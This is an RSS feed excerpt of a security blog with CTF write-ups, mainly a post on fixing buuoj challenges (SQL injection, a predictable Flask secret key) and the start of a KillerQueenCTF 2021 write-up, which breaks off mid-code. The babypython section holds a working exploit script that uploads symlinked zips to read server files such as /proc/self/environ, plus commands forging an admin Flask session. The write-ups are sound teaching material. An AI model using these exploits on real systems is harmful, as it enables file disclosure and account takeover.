<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/posts/</link><description>Recent content in Posts on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 07 Nov 2021 08:57:29 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>buuoj加固题 Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuoj新上了加固题这个分类，也就是线下awdp中fix的部分，只要将靶机中存在的漏洞修复好并通过check的检测即可拿到flag；有一说一，比单纯attack拿flag会简单很多（适合我这种沸物web&lt;/p>
&lt;p>下面的wp会先说纯修复角度，再串一下整体的知识点；因为自己水平有限，想尽可能说的清楚一些就会比较啰嗦，见谅QAQ&lt;/p>
&lt;h2 id="ezsql">Ezsql&lt;/h2>
&lt;h3 id="fix">FIX&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083450780.png" alt="image-20211107083450780">&lt;/p>
&lt;p>200行，太典了，对传入的参数完全没有检测，是个筛子；用预处理的方式修，又可以分为两种形式&lt;/p>
&lt;h3 id="mysql预处理">mysql预处理&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083655664.png" alt="image-20211107083655664">&lt;/p>
&lt;p>其中201行的&lt;code>ss&lt;/code>指的是绑定SQL参数的类型为string，这一项必不可少而且必须与后面的参数一一对应&lt;/p>
&lt;h3 id="pdo预处理">PDO预处理&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107084309239.png" alt="image-20211107084309239">&lt;/p>
&lt;p>PDO预处理属于是通防了，能有效地应对sqli特别是堆叠注入，208行的设置项意为禁用模拟预处理&lt;/p>
&lt;h2 id="ciscn2021-总决赛babypython">[CISCN2021 总决赛]babypython&lt;/h2>
&lt;h3 id="fix-1">FIX&lt;/h3>
&lt;p>ssh连上后看下目录结构&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212456961.png" alt="image-20211106212456961">&lt;/p>
&lt;p>查看/app/y0u_found_it/y0u_found_it_main.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212556547.png" alt="image-20211106212556547">&lt;/p>
&lt;p>11行这不是典中典了？读mac地址就打通了，所以我们直接把SECRET_KEY改为一个又长又乱的随机字符串即可，可以使用&lt;a href="uuid/guid%E7%94%9F%E6%88%90%E5%99%A8">uuid/guid生成器&lt;/a>来生成&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106210732859.png" alt="image-20211106210732859">&lt;/p>
&lt;blockquote>
&lt;p>————碎碎念：这里修复的时候可能看脸？我在几天前试的时候用的一模一样的方法，但是怎么都不能过check，今天试了一次就可以了，但是在写wp的时候再复盘就又不可以了……emmm 可能还是哪里的细节出了错但是我没有注意到？给我整不会了属于是&lt;/p>
&lt;/blockquote>
&lt;h3 id="关于本题">关于本题&lt;/h3>
&lt;p>是个原题，还是个有了包浆的原题，参见-&amp;gt;&lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BHCTF%202018%5DHideandseek">[HCTF 2018]Hideandseek&lt;/a>&lt;/strong> | &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb3">[SWPU2019]Web3&lt;/a>&lt;/strong>，做过的就知道这他妈真的就一模一样hhhhhhhh&lt;/p>
&lt;p>考点在于linux软链接+uuid+flask-session伪造，后者还经常单独出题，比如 &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 华东南赛区]Web4&lt;/a>&lt;/strong>，都快烤烂了&lt;/p>
&lt;h3 id="考点一--uuidsecret_key">考点一 · uuid&amp;amp;SECRET_KEY&lt;/h3>
&lt;p>SECRET_KEY通过uuid+伪随机数的方式生成，这个考点可以参考 &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 华东南赛区]Web4&lt;/a>&lt;/strong>，其中app.py是这样写的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212834438.png" alt="image-20211106212834438">&lt;/p>
&lt;p>&lt;code>uuid.getnode()&lt;/code>会以48位二进制长度的正整数形式返回mac地址，linux下mac地址的位置在&lt;code>/sys/class/net/eth0/address&lt;/code>，读出mac地址后我们也来生成一波伪随机数&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204313712.png" alt="image-20210707204313712">&lt;/p>
&lt;p>之后通过flask-session-cookie-manager一把梭即可伪造session值&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204240633.png" alt="image-20210707204240633">&lt;/p>
&lt;p>————另外，通常访问不存在目录时SECRET_KEY会出现在请求头中&lt;/p>
&lt;h3 id="考点二--linux软链接文件读取zip压缩包">考点二 · linux软链接文件读取&amp;amp;zip压缩包&lt;/h3>
&lt;p>ln -s是linux中的软链接命令，我们可以制作对应文件的绝对路径的软链接来读文件；当不知道flask工作目录可以使用&lt;code>/proc/self/cwd&lt;/code>来指向当前进程的目录&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/cwd/flag/flag/.jpg qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者通过&lt;code>/proc/self/environ&lt;/code>文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/proc目录的妙用&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCE利用总结&lt;/a>，题-&amp;gt;[网鼎杯 2020 白虎组]PicDown&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/environ qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>而对于目录内文件的列举也是有方法的（参考-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF Web题 extract0r Writeup&lt;/a>&lt;/p>
&lt;p>制作好的软链接通过zip打包&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">zip -ry qwe.zip qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>更多题目中的应用可以参见-&amp;gt;&lt;a href="http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/">记录一道题的多种解法&lt;/a>&lt;/p>
&lt;p>关于这个漏洞的实际应用可以参见-&amp;gt;&lt;a href="https://paper.seebug.org/104/">GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞&lt;/a>&lt;/p>
&lt;h3 id="attack">*ATTACK&lt;/h3>
&lt;p>exp.py - 1 生成软链接&amp;amp;zip&amp;amp;自动上传&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">makezip&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ln -s &amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39; exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># os.system(&amp;#39;zip --symlinks exp.zip exp&amp;#39;)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;zip -ry exp.zip exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">makezip&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;the_file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 /proc/self/environ
python3 exp.py /app/y0u_found_it.ini
python3 /app/y0u_found_it/y0u_found_it_main.py
python3 /sys/class/net/eth0/address
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png" alt="image-20211106234837193">&lt;/p>
&lt;p>exp.py - 2 根据mac地址生成伪随机数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">uuid&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;02:42:0a:00:cb:06&amp;#34;&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">bin&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0b&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># 36.014406163923596&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 flask_session_cookie_manager3.py decode -c &lt;span style="color:#d88200">&amp;#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc&amp;#39;&lt;/span>
python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;36.014406163923596&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#34;{u&amp;#39;username&amp;#39;: u&amp;#39;admin&amp;#39;}&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235751916.png" alt="image-20211106235751916">&lt;/p>
&lt;p>翻回头看源码，好家伙这里有内鬼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235832895.png" alt="image-20211106235832895">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075450043.png" alt="image-20211107075450043">&lt;/p>
&lt;p>返回的并不是真正的flag，而是secret.secret中的内容no flah&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075326929.png" alt="image-20211107075326929">&lt;/p>
&lt;p>67行这里会对unzip打开的文件进行检查，只要含有flag字样就会重定向至/?error=1&lt;/p>
&lt;p>————这里我感觉原题应该secret.py中的&lt;code>secret=&lt;/code>直接就能读出来flag，想了好久，再绕一层flag.txt的话我是想不出来什么bypass的方法了，我倾向于是布置环境的时候没有设置这一点（&lt;/p>
&lt;h2 id="ciscn2021-总决赛easy_python">***[CISCN2021 总决赛]easy_python&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212057524.png" alt="image-20211106212057524">&lt;/p>
&lt;p>不知道是我的网络问题还是什么未知的bug……check之后就会宕机，只能重新下发靶机&lt;/p>
&lt;h2 id="ciscn2021-总决赛ezj4va">***[CISCN2021 总决赛]ezj4va&lt;/h2>
&lt;p>&lt;a href="https://juejin.cn/post/6997314123918737422">https://juejin.cn/post/6997314123918737422&lt;/a>&lt;/p>
&lt;p>还不会java 先空着TAT&lt;/p></description></item><item><title>KillerQueenCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</link><pubDate>Sat, 30 Oct 2021 16:39:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</guid><description>&lt;h2 id="webjust-not-my-type">web/Just Not My Type&lt;/h2>
&lt;blockquote>
&lt;p>I really don&amp;rsquo;t think we&amp;rsquo;re compatible (&lt;a href="http://143.198.184.186:7000/">Link&lt;/a>)&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$FLAG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;shhhh you don&amp;#39;t get to see this locally&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">strcasecmp&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$FLAG&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$FLAG&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;That&amp;#39;s the wrong password!&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们的老朋友&lt;code>strcasecmp()&lt;/code>函数，它和&lt;code>strcmp()&lt;/code>函数一样用于比较两个字符串，区别是后者会区分大小写；绕过方式是传入数组，这样会使两个函数无法处理而返回null&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030104447923.png" alt="image-20211030104447923">&lt;/p>
&lt;p>&lt;code>flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}&lt;/code>&lt;/p>
&lt;h2 id="webphat-pottomed-girls">web/PHat Pottomed Girls&lt;/h2>
&lt;blockquote>
&lt;p>Now it&amp;rsquo;s attempt number 3 and this time with a Queen reference! (flag is in the root directory) (&lt;a href="http://143.198.184.186:7001/">Link&lt;/a>)&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">generateRandomString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$characters&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$charactersLength&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$characters&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$randomString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$randomString&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#111">$characters&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$charactersLength&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$randomString&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$originalstring&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$originalstring&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fopen&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
